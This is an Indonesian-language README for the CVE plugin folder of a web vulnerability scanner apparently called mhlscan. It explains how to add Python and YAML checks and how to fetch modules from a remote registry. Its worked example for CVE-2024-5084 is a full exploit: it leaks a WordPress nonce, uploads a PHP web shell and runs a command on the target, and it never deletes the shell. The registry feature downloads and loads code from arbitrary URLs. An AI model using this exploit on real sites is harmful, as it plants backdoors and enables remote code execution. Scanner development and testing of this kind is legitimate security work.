# CVE Modules — Panduan Menambah CVE Custom

Folder ini menyimpan **modul CVE** yang dijalankan otomatis oleh `mhlscan.py`
setelah fingerprint dan version detection selesai.

## Struktur Folder

```
cve_modules/
├── README.md              ← file ini
├── _base.py               ← registry + decorator @cve_module
├── __init__.py            ← auto-discovery + run_all()
├── wordpress_hashform_2024_5084.py
├── wordpress_wpvivid_2026_1357.py
├── wordpress_lfi_wp_lang.py
├── wordpress_stored_xss.py
├── php_session_upload_race.py
├── php_uaf_8_4.py
└── _yaml/                 ← (optional) YAML-based CVEs
    ├── CVE-2024-XXXX.yaml
    └── CVE-2025-YYYY.yaml
```

Setiap file `.py` (kecuali `_base.py` dan `__init__.py`) otomatis di-load saat
`import cve_modules`.

---

# Cara 1 — Manual (Drop File `.py`)

**Cocok untuk:** 1-10 CVE custom, butuh logika deteksi kompleks (POST, OAST,
multi-step, auth).

## Langkah

### 1. Buat file baru

```bash
cd ~/mhlscan
nano cve_modules/my_custom_cve.py
```

### 2. Template minimal

```python
# -*- coding: utf-8 -*-
"""CVE-2024-XXXX - Nama CVE."""

from ._base import cve_module


@cve_module(
    cve_id="CVE-2024-XXXX",
    name="Nama CVE (singkat)",
    severity="high",              # info/low/medium/high/critical
    requires=["wordpress"],       # tag bebas, untuk dokumentasi
    timeout=15,                   # timeout per-request
    description="Deskripsi singkat CVE",
    aggressive=False,             # True = hanya jalan dengan --aggressive
)
def test(url, timeout=15, oast_url=None, **kwargs):
    """
    Return dict:
        {
            "status": "vulnerable" | "potential" | "not_vulnerable" | "unknown",
            "details": "penjelasan singkat",
            "evidence": "bukti yang ditemukan",
            "endpoint": "/path/vulnerable",
            # optional:
            "payload_file": "/path/to/payload",
        }
    """
    import requests
    requests.packages.urllib3.disable_warnings()

    base = url.rstrip("/")

    try:
        r = requests.get(f"{base}/path/to/probe",
                        timeout=timeout, verify=False)

        if r.status_code == 200 and "MARKER_VULNERABLE" in r.text:
            return {
                "status": "vulnerable",
                "details": "CVE detected",
                "evidence": "MARKER_VULNERABLE found in response",
                "endpoint": "/path/to/probe",
            }
    except Exception:
        pass

    return {"status": "not_vulnerable", "details": "Tidak terdeteksi"}
```

### 3. Verifikasi (tanpa scan)

```bash
python3 -c "import cve_modules; cve_modules.list_modules()" | grep CVE-2024-XXXX
```

Output yang benar:
```
    high     CVE-2024-XXXX         Nama CVE (singkat)      [active] req=wordpress
```

### 4. Test langsung (tanpa scan full)

```bash
python3 -c "
import cve_modules
findings = cve_modules.run_all('https://target.com', timeout=15)
for f in findings:
    print(f'{f[\"severity\"]} {f[\"id\"]}: {f[\"name\"]}')
"
```

### 5. Scan normal

```bash
python3 mhlscan.py --sodok https://target.com
```

Module otomatis dipanggil di **Layer 1.8** setelah fingerprint.

---

# Cara 2 — YAML (Semi-Otomatis)

**Cocok untuk:** 10-100 CVE, logika sederhana (GET/POST + status/word/regex
matcher), tidak mau tulis Python.

**Prasyarat:** Setup `_yaml_cve.py` (lihat bagian Setup YAML di bawah).

## Langkah

### 1. Buat file YAML

```bash
nano cve_modules/_yaml/CVE-2024-XXXX.yaml
```

### 2. Format YAML

```yaml
id: CVE-2024-XXXX
name: WordPress Foo Plugin RCE
severity: critical
description: Unauthenticated file upload
test:
  - method: GET
    path: "/wp-content/plugins/foo/readme.txt"
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["Stable tag: 1.0"]
        part: body
```

### 3. Matcher yang Didukung

| Type | Field | Contoh |
|------|-------|--------|
| `status` | `status: [200, 201]` | Match HTTP status |
| `word` | `words: ["text"]` + `part: body\|header` | Match literal string |
| `regex` | `regex: ["pattern"]` + `part: body\|header` | Match regex |

### 4. Multi-request YAML (POST, header)

```yaml
id: CVE-2024-YYYY
name: Custom POST Endpoint
severity: high
test:
  - method: POST
    path: "/api/upload"
    headers:
      Content-Type: "application/json"
    body: '{"file": "test"}'
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["success"]
```

### 5. Test

```bash
python3 -c "import _yaml_cve; print(_yaml_cve.get_all_findings('https://target.com'))"
```

---

# Cara 3 — Remote Registry (Otomatis)

**Cocok untuk:** Tim besar, update centralized, tidak mau SSH ke tiap server.

**Prasyarat:** Setup `_cve_remote.py` (lihat bagian Setup Remote di bawah).

## Format Registry JSON

Host file ini di GitHub Gist / GitHub Pages / S3 / any URL publik:

```json
{
  "version": 1,
  "updated": "2026-11-15",
  "cves": [
    {
      "id": "CVE-2024-5084",
      "name": "WordPress Hash Form File Upload",
      "severity": "critical",
      "url": "https://raw.githubusercontent.com/USER/repo/main/cve/hashform.py",
      "format": "python"
    },
    {
      "id": "CVE-2025-YYYY",
      "name": "Custom YAML CVE",
      "severity": "high",
      "url": "https://raw.githubusercontent.com/USER/repo/main/cve/CVE-2025-YYYY.yaml",
      "format": "yaml"
    }
  ]
}
```

## Cara Update

```bash
python3 mhlscan.py --update-cve-remote https://raw.githubusercontent.com/USER/repo/main/cve_registry.json
```

Output:
```
[*] Fetching registry: https://...
  [+] CVE-2024-5084: downloaded
  [+] CVE-2025-YYYY: downloaded
[+] 2 CVE baru, 0 cached
```

File tersimpan di `~/.mhlscan/remote_cves/`. Otomatis di-load saat scan.

## Update Berkala

Tambahkan ke cron weekly:

```bash
# crontab -e
0 4 * * 0 cd ~/mhlscan && python3 mhlscan.py --update-cve-remote https://raw.githubusercontent.com/USER/repo/main/cve_registry.json >> /var/log/mhlscan_cve.log 2>&1
```

---

# Setup Tambahan (Sekali Saja)

## Setup YAML (untuk Cara 2)

**File 1:** `_yaml_cve.py` (di root `~/mhlscan/`, bukan di `cve_modules/`)

```python
# -*- coding: utf-8 -*-
"""_yaml_cve.py - Loader YAML-based CVE modules."""
import yaml
from pathlib import Path
import requests
import re

YAML_DIR = Path(__file__).parent / "cve_modules" / "_yaml"

def load_all(yaml_dir=None):
    d = Path(yaml_dir or YAML_DIR)
    d.mkdir(parents=True, exist_ok=True)
    cves = []
    for yf in sorted(d.glob("*.yaml")):
        try:
            data = yaml.safe_load(yf.read_text())
            if data and "id" in data and "test" in data:
                data["_file"] = yf.name
                cves.append(data)
        except Exception as e:
            print(f"[yaml-cve] {yf.name}: {e}")
    return cves

def run_test(url, spec, timeout=15, oast_url=None):
    base = url.rstrip("/")
    requests.packages.urllib3.disable_warnings()
    for req_spec in spec.get("test", []):
        method = req_spec.get("method", "GET").upper()
        path = req_spec.get("path", "/")
        target = base + path
        try:
            r = requests.request(method, target,
                headers=req_spec.get("headers", {}),
                data=req_spec.get("body", ""),
                timeout=timeout, verify=False)
        except Exception as e:
            return {"status": "error", "details": str(e)}

        matched = True
        for m in req_spec.get("matchers", []):
            mtype = m.get("type")
            if mtype == "status":
                if r.status_code not in m.get("status", []):
                    matched = False; break
            elif mtype == "word":
                body = r.text.lower() if m.get("part") == "body" else str(r.headers).lower()
                for w in m.get("words", []):
                    if w.lower() not in body:
                        matched = False; break
            elif mtype == "regex":
                body = r.text if m.get("part") == "body" else str(r.headers)
                for pattern in m.get("regex", []):
                    if not re.search(pattern, body):
                        matched = False; break
        if matched:
            return {"status": "vulnerable", "details": f"{method} {path}",
                    "evidence": f"Matched at {target}", "endpoint": path}
    return {"status": "not_vulnerable", "details": "No matcher matched"}

def get_all_findings(url, timeout=15, oast_url=None):
    findings = []
    for spec in load_all():
        result = run_test(url, spec, timeout=timeout)
        if result.get("status") == "vulnerable":
            findings.append({
                "id": spec["id"],
                "name": spec.get("name", spec["id"]),
                "severity": spec.get("severity", "high"),
                "type": "yaml-cve", "url": url,
                "endpoint": result.get("endpoint", "/"),
                "evidence": result.get("evidence", ""),
                "details": result.get("details", ""),
                "source": "yaml-cve",
            })
    return findings
```

**File 2:** Install dependency

```bash
pip install pyyaml --break-system-packages 2>/dev/null || pip install pyyaml
python3 -m py_compile _yaml_cve.py && echo "OK"
```

**File 3:** Wire ke `mhlscan.py`

```bash
nano /tmp/wire_yaml.py
```

```python
with open('/root/mhlscan/mhlscan.py') as f:
    lines = f.readlines()

NL = "\n"; changes = 0

if not any("import _yaml_cve" in l for l in lines):
    idx = next((i for i, l in enumerate(lines) if l.strip().startswith("import _recon, _payloads")), None)
    if idx:
        indent = " " * (len(lines[idx]) - len(lines[idx].lstrip()))
        lines.insert(idx + 1, indent + "import _yaml_cve\n")
        print("+ import _yaml_cve"); changes += 1

if "_yaml_cve.get_all_findings" not in "".join(lines):
    idx = next((i for i, l in enumerate(lines) if "LAYER 2: GENERIC" in l), None)
    if idx:
        indent = " " * (len(lines[idx]) - len(lines[idx].lstrip()))
        block = [
            indent + "# ============ LAYER 1.85: YAML CVE ============" + NL,
            indent + "if not skip_generic and not jboss_only:" + NL,
            indent + "    try:" + NL,
            indent + "        for _yf in _yaml_cve.get_all_findings(url, timeout=min(timeout, 15)):" + NL,
            indent + "            _enrich(_yf, url, 'yaml-cve')" + NL,
            indent + "            result['findings'].append(_yf)" + NL,
            indent + "            _c = SEVERITY_COLOR.get(_yf['severity'], ENDC)" + NL,
            indent + "            print(f\"  {_c}[{_yf['severity']:>8}]{ENDC} [{_yf['id']}] {_yf['name']}\")" + NL,
            indent + "    except Exception as _e:" + NL,
            indent + "        result['errors'].append(f'yaml-cve: {type(_e).__name__}')" + NL,
            NL,
        ]
        lines[idx:idx] = block
        print("+ LAYER 1.85 YAML call"); changes += 1

with open('/root/mhlscan/mhlscan.py', 'w') as f:
    f.writelines(lines)
print(f"DONE: {changes} changes")
```

```bash
python3 /tmp/wire_yaml.py
python3 -m py_compile mhlscan.py && echo "OK"
```

## Setup Remote Registry (untuk Cara 3)

**File 1:** `_cve_remote.py` (di root `~/mhlscan/`)

```python
# -*- coding: utf-8 -*-
import json
import requests
from pathlib import Path

CACHE_DIR = Path.home() / ".mhlscan" / "remote_cves"

def update_from_registry(registry_url, timeout=30):
    CACHE_DIR.mkdir(parents=True, exist_ok=True)
    print(f"[*] Fetching registry: {registry_url}")
    r = requests.get(registry_url, timeout=timeout)
    r.raise_for_status()
    reg = r.json()
    downloaded = 0
    for cve in reg.get("cves", []):
        cve_id = cve["id"]
        fmt = cve.get("format", "python")
        ext = "py" if fmt == "python" else "yaml"
        dest = CACHE_DIR / f"{cve_id}.{ext}"
        if dest.exists():
            print(f"  [=] {cve_id}: cached")
            continue
        try:
            rc = requests.get(cve["url"], timeout=timeout)
            if rc.status_code == 200:
                dest.write_text(rc.text)
                downloaded += 1
                print(f"  [+] {cve_id}: downloaded")
        except Exception as e:
            print(f"  [!] {cve_id}: {e}")
    print(f"\n[+] {downloaded} CVE baru, {len(reg['cves']) - downloaded} cached")
    return downloaded

def list_installed():
    if not CACHE_DIR.exists():
        return []
    return sorted([f.stem for f in CACHE_DIR.glob("*.*")])
```

**File 2:** Wire CLI flag

```bash
nano /tmp/wire_remote.py
```

```python
with open('/root/mhlscan/mhlscan.py') as f:
    src = f.read()

if "--update-cve-remote" not in src:
    old = '    p.add_argument("--skip-http-methods", action="store_true",'
    new = '''    p.add_argument("--update-cve-remote", metavar="URL",
                   help="Update CVE dari remote registry JSON")
    p.add_argument("--skip-http-methods", action="store_true",'''
    src = src.replace(old, new, 1)

if "update_cve_remote" not in src.split("def main")[1][:2000]:
    old = '    if args.update: run_update("default"); return 0'
    new = '''    if getattr(args, 'update_cve_remote', None):
        import _cve_remote
        _cve_remote.update_from_registry(args.update_cve_remote)
        return 0
    if args.update: run_update("default"); return 0'''
    src = src.replace(old, new, 1)

with open('/root/mhlscan/mhlscan.py', 'w') as f:
    f.write(src)
print("DONE")
```

```bash
python3 /tmp/wire_remote.py
python3 -m py_compile mhlscan.py && echo "OK"
```

---

# Contoh Real — CVE-2024-5084 (WordPress Hash Form)

## File: `cve_modules/wordpress_hashform_2024_5084.py`

```python
# -*- coding: utf-8 -*-
"""CVE-2024-5084 - WordPress Hash Form Unauthenticated File Upload → RCE."""

import re
import requests
from ._base import cve_module


@cve_module(
    cve_id="CVE-2024-5084",
    name="WordPress Hash Form Unauthenticated File Upload",
    severity="critical",
    requires=["wordpress", "hash-form-plugin"],
    timeout=20,
    description="Nonce leak → upload PHP → RCE",
)
def test(url, timeout=20, oast_url=None, **kwargs):
    base = url.rstrip("/")
    requests.packages.urllib3.disable_warnings()

    # 1. Cek plugin terinstall
    try:
        r = requests.head(f"{base}/wp-content/plugins/hash-form/",
                         timeout=timeout, verify=False, allow_redirects=False)
        if r.status_code not in (200, 301, 403):
            return {"status": "not_vulnerable",
                    "details": "Plugin hash-form tidak terdeteksi"}
    except Exception:
        return {"status": "not_vulnerable", "details": "connection failed"}

    # 2. Leak nonce
    try:
        r = requests.get(base, timeout=timeout, verify=False)
        nonce = None
        for pattern in [r'"ajax_nounce":"(\w+)"', r'"ajax_nonce":"(\w+)"']:
            m = re.search(pattern, r.text)
            if m:
                nonce = m.group(1)
                break
        if not nonce:
            return {"status": "unknown", "details": "Nonce not found"}
    except Exception as e:
        return {"status": "error", "details": type(e).__name__}

    # 3. Upload shell
    shell = '<?php system($_GET["cmd"]); ?>'
    params = {
        "action": "hashform_file_upload_action",
        "file_uploader_nonce": nonce,
        "allowedExtensions[0]": "php",
        "sizeLimit": 1048576,
        "qqfile": "mhlscan_probe.php",
    }
    try:
        r = requests.post(f"{base}/wp-admin/admin-ajax.php",
                         params=params, data=shell, timeout=timeout, verify=False)
        resp = r.json()
        shell_url = resp.get("url")
        if not shell_url:
            return {"status": "not_vulnerable", "details": "No shell URL"}

        # 4. Verify RCE
        check = requests.get(f"{shell_url}?cmd=echo+MHLSCAN_PROBE_OK",
                            timeout=timeout, verify=False)
        if "MHLSCAN_PROBE_OK" in check.text:
            return {
                "status": "vulnerable",
                "details": "PHP shell uploaded + RCE verified",
                "evidence": f"Shell: {shell_url}",
                "endpoint": "/wp-admin/admin-ajax.php",
                "payload_file": shell_url,
            }
        return {"status": "potential", "details": "Upload OK, RCE not verified",
                "payload_file": shell_url}
    except Exception as e:
        return {"status": "error", "details": type(e).__name__}
```

Test:

```bash
python3 -c "import cve_modules; cve_modules.list_modules()" | grep CVE-2024-5084
```

---

# Troubleshooting

## Module tidak ter-load

```bash
# Cek syntax
python3 -m py_compile cve_modules/your_file.py

# Cek import
python3 -c "import cve_modules; cve_modules.list_modules()"
```

Kalau ada error, module tidak akan ter-load. Perbaiki syntax dulu.

## Module ter-load tapi tidak trigger

**Cek 1:** Status return bukan `"vulnerable"`?
- Module hanya trigger kalau return `{"status": "vulnerable"}` atau `{"status": "potential"}`

**Cek 2:** Target tidak sesuai `requires`?
- `requires=["wordpress"]` hanya dokumentasi — tidak memblokir eksekusi
- Tapi logic di `test()` perlu filter (misal cek path `/wp-content/`)

**Cek 3:** Exception ter-swallow?
- `@cve_module` decorator catch exception → return `{"status": "error"}`
- Cek `result['errors']` di report

## Disable module sementara

```bash
python3 mhlscan.py --sodok https://target.com --disable-cve CVE-2024-5084
```

Atau edit `_base.py` untuk disable permanen:

```python
# Di akhir file cve_modules/your_cve.py
from ._base import disable
disable("CVE-2024-5084")  # comment untuk enable lagi
```

## List semua module aktif

```bash
python3 mhlscan.py --list-cves
```

Output:
```
CVE Modules (8):
  Registered CVE modules: 8
    critical CVE-2016-3714         ImageMagick ImageTragick RCE
    critical CVE-2023-20198        Cisco IOS XE Web UI Priv Esc
    critical CVE-2024-5084         WordPress Hash Form File Upload
    ...
```

---

# Best Practice

## 1. Naming Convention

| File | Pattern |
|------|---------|
| `wordpress_<plugin>_<year>_<cve>.py` | wordpress_hashform_2024_5084.py |
| `cve_<year>_<cve>.py` | cve_2024_5084.py |
| `<vendor>_<product>_<cve>.py` | cisco_ios_2023_20198.py |

## 2. Severity Mapping

| CVE Score | `severity` |
|-----------|-----------|
| 9.0-10.0 | `critical` |
| 7.0-8.9 | `high` |
| 4.0-6.9 | `medium` |
| 0.1-3.9 | `low` |
| — | `info` |

## 3. Timeout

- Simple GET → `timeout=10`
- POST upload → `timeout=20`
- OAST/race → `timeout=45`
- Default → `timeout=15`

## 4. Error Handling

Selalu wrap di `try/except`. Decorator `@cve_module` sudah catch exception
generik, tapi wrap spesifik untuk return detail yang lebih baik.

## 5. Idempotent

Module tidak boleh **mengubah state** target (kecuali cleanup). Kalau upload
file, hapus setelah verifikasi.

## 6. Test Lokal Dulu

Sebelum push ke production:

```bash
# Test standalone
python3 -c "
import cve_modules
r = cve_modules.run_all('http://localhost:8080', timeout=10)
for f in r: print(f)
"
```

---

# Referensi

- **CVE Database:** https://nvd.nist.gov/
- **Nuclei Templates:** https://github.com/projectdiscovery/nuclei-templates
- **Exploit-DB:** https://www.exploit-db.com/
- **Base decorator:** `cve_modules/_base.py`
- **Contoh lengkap:** `wordpress_hashform_2024_5084.py`

---

**Untuk pertanyaan atau bug:** buka issue di repo internal MHLScan.
